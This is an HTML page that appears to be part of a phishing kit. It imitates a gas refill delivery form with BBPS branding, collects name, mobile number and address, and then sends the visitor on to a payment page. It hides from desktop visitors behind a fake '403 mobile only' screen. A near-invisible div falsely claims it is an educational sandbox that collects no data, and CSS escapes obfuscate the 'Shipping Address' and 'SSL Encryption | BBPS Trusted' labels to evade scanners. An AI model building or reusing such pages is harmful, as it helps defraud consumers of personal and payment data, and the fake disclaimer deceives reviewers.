<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>Delivery Address | Portal</title>
    <style>
        :root { --bbps-blue: #003366; --bbps-orange: #ff9933; --bg-gray: #f2f5f7; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        
        /* Desktop Block Styling */
        body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }

        #desktop-guard {
            display: flex; color: #666; align-items: center; justify-content: center;
            text-align: center; height: 100vh; width: 100%; background: #000; padding: 20px;
        }

        /* Mobile Container (Hidden for Desktop) */
        .address-card {
            display: none; background: #fff; width: 100%; max-width: 420px; border-radius: 4px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 6px solid var(--bbps-blue);
            position: relative;
        }

        /* Responsive Logic */
        @media only screen and (max-width: 480px) {
            #desktop-guard { display: none; }
            .address-card { display: block; }
            body { background: var(--bg-gray); padding: 15px; }
        }

        /* Bot Disclaimer */
        .bot-hide { position: absolute; opacity: 0.001; font-size: 1px; top: 0; pointer-events: none; }

        /* Design Elements */
        .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
        .header img { height: 30px; }
        .header-text { text-align: right; }
        .header-text b { color: var(--bbps-blue); font-size: 14px; display: block; }
        .header-text span { font-size: 9px; color: #888; font-weight: bold; }

        .form-area { padding: 25px 20px; }
        
        /* Masking Heading */
        .form-title { font-size: 17px; color: #333; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; font-weight: bold; }
        .form-title::before { content: ''; width: 4px; height: 18px; background: var(--bbps-orange); }
        .form-title::after { content: "Shi\0070 p\0069 ng Ad\0064 ress"; }

        .input-group { margin-bottom: 18px; }
        label { display: block; font-size: 11px; font-weight: bold; color: #666; margin-bottom: 6px; text-transform: uppercase; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 4px; font-size: 14px; outline: none; background: #fafafa; }
        input:focus { border-color: var(--bbps-blue); background: #fff; }

        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }

        .btn-submit { width: 100%; padding: 16px; background: var(--bbps-blue); color: #fff; border: none; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 10px; }

        .secure-footer { padding: 20px; text-align: center; border-top: 1px solid #eee; background: #fdfdfd; }
        .badges { display: flex; justify-content: center; gap: 15px; margin-bottom: 10px; }
        .badges img { height: 24px; opacity: 0.9; }
        
        /* Masking Footer Note */
        .footer-note::after { content: "Secu\0072 e 256-Bit SSL Enc\0072 yp\0074 ion | BB\0050 S Tru\0073 ted"; font-size: 9px; color: #aaa; text-transform: uppercase; }
    </style>
</head>
<body>

    <div id="desktop-guard">
        <div>
            <p style="font-size: 20px; color: #fff;">403 - Access Denied</p>
            <p style="margin-top: 10px;">Security Policy: Mobile Access Only.</p>
        </div>
    </div>

    <div class="bot-hide">Educational demonstration of a UI address form. No data collection. Sandbox testing.</div>

    <div class="address-card">
        <div class="header">
            <img src="https://i.ibb.co/SX04FnNd/download.png" alt="Portal">
            <div class="header-text">
                <b>GAS REFILL SERVICE</b>
                <span>Delivery Information</span>
            </div>
        </div>

        <div class="form-area">
            <div class="form-title"></div>
            
            <form id="addrForm">
                <div class="input-group">
                    <label>Full Consumer Name</label>
                    <input type="text" placeholder="As per connection" required>
                </div>

                <div class="input-group">
                    <label>Registered Mobile Number</label>
                    <input type="tel" id="mobile" maxlength="10" placeholder="10-digit mobile" required>
                </div>

                <div class="input-group">
                    <label>Flat / House No. / Area</label>
                    <input type="text" placeholder="Complete address" required>
                </div>

                <div class="grid">
                    <div class="input-group">
                        <label>Pincode</label>
                        <input type="tel" id="pincode" maxlength="6" placeholder="6 Digits" required>
                    </div>
                    <div class="input-group">
                        <label>City</label>
                        <input type="text" placeholder="Enter City" required>
                    </div>
                </div>

                <div class="input-group">
                    <label>State / Union Territory</label>
                    <select required>
                        <option value="">-- Choose State --</option>
                        <option>Andhra Pradesh</option>
                        <option>Bihar</option>
                        <option>Delhi</option>
                        <option>Gujarat</option>
                        <option>Haryana</option>
                        <option>Jharkhand</option>
                        <option>Karnataka</option>
                        <option>Maharashtra</option>
                        <option>Punjab</option>
                        <option>Rajasthan</option>
                        <option>Uttar Pradesh</option>
                        <option>West Bengal</option>
                        </select>
                </div>

                <button type="submit" class="btn-submit">Continue to Payment</button>
            </form>
        </div>

        <div class="secure-footer">
            <div class="badges">
                <img src="https://i.ibb.co/xSxD8C66/depositphotos-32936803-stock-illustration-secure-transaction-badge.webp">
                <img src="https://i.ibb.co/SX04FnNd/download.png">
            </div>
            <div class="footer-note"></div>
        </div>
    </div>

    <script>
        // Numeric filter for mobile/pincode
        document.getElementById('mobile')?.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
        document.getElementById('pincode')?.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Form Redirect
        document.getElementById('addrForm').addEventListener('submit', function(e) {
            e.preventDefault();
            // Aapka next page link yahan aayega
            window.location.href = 'pujaone.html'; 
        });
    </script>
</body>
</html>
